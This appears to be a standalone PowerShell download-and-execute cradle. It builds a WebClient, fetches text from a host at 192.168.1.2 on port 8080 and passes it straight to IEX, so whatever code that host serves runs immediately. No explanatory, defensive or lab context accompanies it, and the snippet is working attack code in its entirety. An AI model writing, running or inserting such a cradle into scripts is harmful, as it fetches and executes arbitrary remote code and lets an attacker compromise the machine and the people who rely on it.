$client = New-Object System.Net.WebClient
$data = $client.DownloadString("http://192.168.1.2:8080")
IEX $data
